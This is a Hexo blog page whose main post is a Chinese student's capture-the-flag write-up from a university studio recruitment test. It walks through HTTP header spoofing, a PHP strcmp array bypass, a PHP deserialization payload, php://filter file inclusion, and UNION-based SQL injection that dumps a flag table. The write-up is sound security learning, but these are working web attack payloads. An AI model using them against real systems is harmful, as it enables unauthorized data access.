<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-可以吗" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/03/01/%E5%8F%AF%E4%BB%A5%E5%90%97/" class="article-date">
  <time datetime="2021-03-01T11:43:15.000Z" itemprop="datePublished">2021-03-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/01/%E5%8F%AF%E4%BB%A5%E5%90%97/">可以吗？</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>能成功吗？我抱着疑问。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/03/01/%E5%8F%AF%E4%BB%A5%E5%90%97/" data-id="cklqinztm0001kgui5ju0gqen" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-我在大一工作室二面招新时做的题wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/12/14/%E6%88%91%E5%9C%A8%E5%A4%A7%E4%B8%80%E5%B7%A5%E4%BD%9C%E5%AE%A4%E4%BA%8C%E9%9D%A2%E6%8B%9B%E6%96%B0%E6%97%B6%E5%81%9A%E7%9A%84%E9%A2%98wp/" class="article-date">
  <time datetime="2020-12-14T14:23:50.000Z" itemprop="datePublished">2020-12-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/12/14/%E6%88%91%E5%9C%A8%E5%A4%A7%E4%B8%80%E5%B7%A5%E4%BD%9C%E5%AE%A4%E4%BA%8C%E9%9D%A2%E6%8B%9B%E6%96%B0%E6%97%B6%E5%81%9A%E7%9A%84%E9%A2%98wp/">我在大一工作室二面招新时做的题wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>题外话：招新对于我来说，真的是一次很珍贵的体验。我也从中学会了很多东西，也知道自己和别人有不小的差距。虽然这一次倒在了最后的面试，但我不会放弃的。我仍然会努力补上来。</p>
<p>（<strong>1）凌睿第二题</strong>，</p>
<p>主要是熟悉一下常见编码，找了个讲述比较全的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/mdxiaohu/article/details/81318643#web%E5%89%8D%E7%AB%AF%E7%AE%80%E4%BB%8B">https://blog.csdn.net/mdxiaohu/article/details/81318643#web%E5%89%8D%E7%AB%AF%E7%AE%80%E4%BB%8B</a></p>
<p>从这里面知道了<!--注释-->是注释的意思。然后按F12我看到了在正常代码下面有一行注释，注释内容是一串乱码。所以我猜是加密过了。因为我之前知道的加密方式只有base64，所以我先试了试这个。然后就成了。还算简单。</p>
<p><strong>（2）凌睿第三题</strong>，</p>
<p>先下载了burp suite。然后在b站学了基本用法<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1T7411m7KG">https://www.bilibili.com/video/BV1T7411m7KG</a></p>
<p>然后就去指定网站抓包。其实就把前几章看了，更多的地方是直接在网上搜博客学怎么用burp suite的。</p>
<p>首先说这个网站，我最开始是完全懵的。还是先按F12，看代码，然后发现没什么用。于是就感觉好像必须用burp suite才能得到结果。这个过程中，我知道要设置代理服务器，设置完后，还要弄一个协议，才能在开着burp suite的情况下上网。</p>
<p>bp有两个功能是做这道题需要用到的，一个是proxy要抓包，另一个是repeater，抓过包之后，要把包送到这里，然后改包，send之后看response。</p>
<p>我最开始的时候，被hint的第一条内容吸引了。http请求头，是我首先去了解的，找了个比较全的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42350419/article/details/82841192">https://blog.csdn.net/qq_42350419/article/details/82841192</a></p>
<p>学完之后，我以为flag在http请求头里，所以我对每一条都认真分析，看flag到底应该藏在哪里。最后我的注意力放到了cookie上，因为感觉这个东西会包含的信息会很多。于是，我就又去查cookie信息包含了什么。还有cookie信息怎么解读。但是找了一天毫无收获。</p>
<p>第二天我又这么干，不过这次我把第二天抓到的包的信息与第一天抓的进行对比。发现cookie不一样（惨）然后我突发奇想，我换一个浏览器，抓到的包信息会不会一样。于是我把Google和edge的结果进行对比，然后找到其中相同的地方，那么这些地方就应该是藏flag的地方（在走偏的路上越走越远)</p>
<p>之后我也看了不少ctf的题和解法，慢慢了解到我之前的想法是不对的。在某一次找题的时候，偶然看到了好像跟Referer有关。我就想到了网站上的那一句话You should come from “<a target="_blank" rel="noopener" href="http://www.google.com&quot;/">www.google.com&quot;</a> 之前我一直不理解，然后我突然有想法：这是告诉我，我应该从谷歌来这个网页，于是写了一条：referer:<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
<p>然后返回的果然变了。说让我只能在本地看。</p>
<p>我把host改成127.0.0.1，但结果还是不对，然后就又卡了</p>
<p>直到我又刷到了一个博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44953600/article/details/107515973?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_44953600/article/details/107515973?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242</a></p>
<p>我要是早点找到这个就好了。从这个里面，我知道了我要加一句X-Forwarded-For ：127.0.0.1才算是本地访问。</p>
<p>然后就给我来了个“你需要用commodo浏览器”我在User-Agent中把浏览器改成了commodo，他就说这个是简称，我应该写全称。又卡了。</p>
<p>最后，我在谷歌搜索中找到了一个博客，上面写着Commodore 64是全称，我就试了试，最后终于成了。</p>
<p>真的是太不容易了，主要是最开始的思路走偏了，而且偏的很严重…也是之后看了数不清的有关ctf的博客，才把思路正回来。过程真的是太艰难了….</p>
<p><strong>（3）凌锐php第一题</strong>，</p>
<p>实际上考察了strcmp()漏洞，strcmp比较两个字符串，如果str1小于str2返回&lt;0。如果str1大于str2返回&gt;0。如果相等返回0。因为比较的两者不是同一种类型，所以只会返回0，即结果是比较的两个东西相等。所以，需要绕过验证。绕过的方法是上传的b是一个数组或者一个object即可，但这个只能上传字符串类型，那么，就让b是数组就可以了。在网站后面加一个”?b[]=123”就表示b成了一个数组。然后结果就出来了。（用百度查了两天，没搞懂是怎么回事。用谷歌只用了早读不到半个小时就会了。）</p>
<p>参考网站：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3085">https://xz.aliyun.com/t/3085</a></p>
<p>（<strong>4）凌锐php第二题</strong>，</p>
<p>目前的想法是，flag藏在flag.php中,而__construct()中的命令会让file附上index.php。那么把file设为flag.php,调用__destruct()，并且绕过__construct。应该找到php序化然后用base64编码一下，写到网站后面就行了。但是，我还不知道怎么做。而且好像失败了。</p>
<p>终于做出来了。</p>
<p>说一下我的想法，这个是先创建了一个类，Hit。然后这个类里面有两个public变量。还有最重要的是有__construct()和__destruct()。</p>
<p>__construct是在对象创建时调用此方法。在后面if语句中创建了一个变量str，__construct被调用，file被赋值为”index.php”。flag在flag.php所以要想办法把file赋值改成”flag.php”，得到flag是需要__destruct，因为这个函数会转达process，转到process才有可能输出flag。所以先说如何能用到__destruct。</p>
<p>__destruct是对象被销毁时执行。而对象被销毁，就要用到反序列化了。那就是if中的unserialize。这里面有一个GET[su29029]所以是要获取su29029的内容。将这个内容赋给变量str。然后在反序列化变量str。</p>
<p>然后就要说到，到process中之后，应该怎么做。这里面有两个判断。先判断content是不是”Hello World”是的话输出”?”但这个不是我们想要的。我们要这个判断是假，然后进入下一个判断。判断content是不是su29029。是的话，就输出flag。并且注释里说的很明确，flag在flag.php。所以任务就很明确了。</p>
<p>先创建一个类，命名为Hit，创建两个public变量file和content。file赋值flag.php，content赋值su29029。对这个类序列化得到结果。大致这样：</p>
<?php 
 class Hit {
     public $file = 'flag.php';
     public $content = 'su29029';
 }
    $obj = new Hit();
    $str = serialize($obj);
    echo $str;

?><p> </p>
<p>得到结果：O:3:”Hit”:2:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}</p>
<p>然后在网页后写上“?su29029=O:3:”Hit”:2:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}”答案就出来了。</p>
<p>这道题没有加__wakeup()函数，算是降低难度了，__wakeup()是在反序列化字符串时调用。绕过的方法就是改变对象属性的个数。也就是O:3:”Hit”:<strong>2</strong>:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}中的”2”改为”3”</p>
<p>这道题的两个变量是public类型的，使用比较简单。如果是private类的，那么就需要加%00，即%00类的名字%00属性名字 %00Hit%00file</p>
<p><strong>（5）凌锐Linux题</strong>：</p>
<p>现在有个想法，因为可能与vim有关，所以可能是关于“备份文件”的。vim会自动保存swp后缀的备份文件。如果下载到源文件，可能能拿到flag。另一个问题是，题目中还提到了一个robot，这可能是robot协议。是跟网页有关的。感觉会和解题有关。</p>
<p>用御剑扫描一下网站，扫出来了robots.txt。点开网站<a target="_blank" rel="noopener" href="http://v8.su29029.xyz:10005/robots.txt">http://v8.su29029.xyz:10005/robots.txt</a></p>
<p>发现有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;fl4g_1s_h3re.php</span><br></pre></td></tr></table></figure>

<p>把 /fl4g_1s_h3re.php放在网站后面，成<a target="_blank" rel="noopener" href="http://v8.su29029.xyz:10005/fl4g_1s_h3re.php">http://v8.su29029.xyz:10005/fl4g_1s_h3re.php</a></p>
<p>结果网站显示了Can you find out the flag?</p>
<p>看来还需要一些步骤。</p>
<p>这一回，我直接在robots.txt后面加/fl4g_1s_h3re.php，结果显示Access denied。<a target="_blank" rel="noopener" href="http://v8.su29029.xyz:10005/robots.txt/fl4g_1s_h3re.php">http://v8.su29029.xyz:10005/robots.txt/fl4g_1s_h3re.php</a></p>
<p>题目中说“机器人恶意删除了我的vim编辑器”所以我猜这一句话的意思是，vim编辑器意外退出产生临时文件swp。所以我应该找到并下载这个文件。经过不断在网站后面加.swp后缀后，这个文件不知道什么时候就下载下来了。挺突然的…..然后才知道，这个是要在根目录的路径是在10005/后直接加”.index.php.swp”即<a target="_blank" rel="noopener" href="http://v8.su29029.xyz:10005/.index.php.swp">http://v8.su29029.xyz:10005/.index.php.swp</a></p>
<p>记住swp这类隐藏文件在调用时前面要加一个“.”</p>
<p>然后就是把这个文件移动到Linux系统里，用vim编辑器，输入“vim -r index.php.wsp”修复这个文件，然后就出现了代码：</p>
<p>&lt;meta charset=”utf8”&gt;<br>&lt;?php<br>echo “Do you like linux and robot?”;<br>error_reporting(0);<br>$file = $_GET[“file”];<br>if(stristr($file,”php://input”) || stristr($file,”zip://“) || stristr($file,”phar://“) || stristr($file,”data:”)){<br>        exit(‘hacker!’);<br>}<br>if($file){<br>        include($file);<br>}<br>?&gt;<br>&lt;/meta&gt;!</p>
<p>好吧，又该看代码了。这个是文件包含漏洞。通过php函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入</p>
<p>这里需要绕过stristr函数，这个东西把好多php伪协议过滤了。</p>
<p>不过留了一个php://filter没过滤。所以就需要用这个。</p>
<p>？file=php://filter/read=convert.base64-encode/resource=fl4g_1s_h3re.php</p>
<p>得到base64编码后的字符串，再用base64解码器解一下，flag就出来了。</p>
<p>参考网站：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p>
<p><strong>（6）凌锐sql注入第一题</strong>：</p>
<p>先用万能密码(0’ or 1=1 – )试一下得到了用户名Aione密码er_ci_yuan，显然没什么用…</p>
<p>第一步：看有多少字段，输一个1’order by 3 – ，显示找不到。输一个“0’ order by 2 – ”，然后显示没问题。所以应该是有两个字段。</p>
<p>第二步：爆库名<br>‘ union select 1,group_concat(table_schema) from information_schema.tables #<br>得到这个<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema<br>加一个消除处重复行<br>‘ union select 1,group_concat(distinct table_schema) from information_schema.tables #<br>得到<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:easy_sql,information_schema<br>这个easy_sql应该就包含了flag。库名就是easy_sql</p>
<p>第三步：表名<br>‘ union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=’easy_sql’ #<br>‘ union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database() #</p>
<p>上面两种都行</p>
<p>得到<br>Login success, your flag is flag{*<strong>**</strong>}<br>Your login name is:1<br>Your password is:easy_sql,fl4g<br>表fl4g,sc</p>
<p>第四步：列<br>‘ union select 1,group_concat(distinct column_name) from information_schema.columns where table_name=’fl4g’ #<br>得到<br>Login success, your flag is flag{*<strong>**</strong>}<br>Your login name is:1<br>Your password is:flag<br>得到列：flag</p>
<p>第五步：查flag<br>‘union select 1,group_concat(flag) from easy_sql.fl4g #<br>得到<br>Login success, your flag is flag{*<strong>**</strong>}<br>Your login name is:1<br>Your password is:lrstudio{0h_you_ar3_g00d_1t_my5q1i}</p>
<p><strong>（7）凌锐sql注入第二题</strong>：</p>
<p>还是先用万能密码试了一下，能登陆成功。</p>
<p>第一步：还是先查一下有多少字段，这一次查到三还是没问题，查到四显示出错。所以这一次的字段数是三。</p>
<p>第二步：爆库名，输入’ union select 1,group_concat(table_schema) from information_schema.tables #就不行了，成显示Hacker了。那就是过滤了这个查询。想双写绕过，结果也不行（悲）</p>
<p>想用报错注入，结果也被过滤了（惨）。用bp模糊注入了一下，发现过滤的语句有：select   insert   insERT  INSERT   COLUMN   COlumn   IF  UPDATE  update  drop  DROP  information_schema.tables   updatexml</p>
<p>以及，报错信息也被过滤掉了。那意思就是让我盲注了。怪不得让我写Python代码。</p>
<p>以上就是我二面招新这个一个月以来做的所有题。哎，最后倒在了boss题上。但，我这个进度只能算是进入最后面试的最低资格（无奈）。最后还是因为基础不牢，被刷下来了。毕竟这是工作室，不是慈善机构，没能力就是不能进。所以…继续努力学吧。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/14/%E6%88%91%E5%9C%A8%E5%A4%A7%E4%B8%80%E5%B7%A5%E4%BD%9C%E5%AE%A4%E4%BA%8C%E9%9D%A2%E6%8B%9B%E6%96%B0%E6%97%B6%E5%81%9A%E7%9A%84%E9%A2%98wp/" data-id="ckk4v20ee0000m0uibrg64ek0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/04/hello-world/" class="article-date">
  <time datetime="2020-10-04T02:17:39.228Z" itemprop="datePublished">2020-10-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/04/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>越共探头，芜湖起飞</p>
<p>感谢马渝江学长对我的指导。</p>
<p>感谢韦阳前辈的教程<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35668237">https://zhuanlan.zhihu.com/p/35668237</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/10/04/hello-world/" data-id="ckfuh85ek0000pkui4kav03rz" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/01/%E5%8F%AF%E4%BB%A5%E5%90%97/">可以吗？</a>
          </li>
        
          <li>
            <a href="/2020/12/14/%E6%88%91%E5%9C%A8%E5%A4%A7%E4%B8%80%E5%B7%A5%E4%BD%9C%E5%AE%A4%E4%BA%8C%E9%9D%A2%E6%8B%9B%E6%96%B0%E6%97%B6%E5%81%9A%E7%9A%84%E9%A2%98wp/">我在大一工作室二面招新时做的题wp</a>
          </li>
        
          <li>
            <a href="/2020/10/04/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>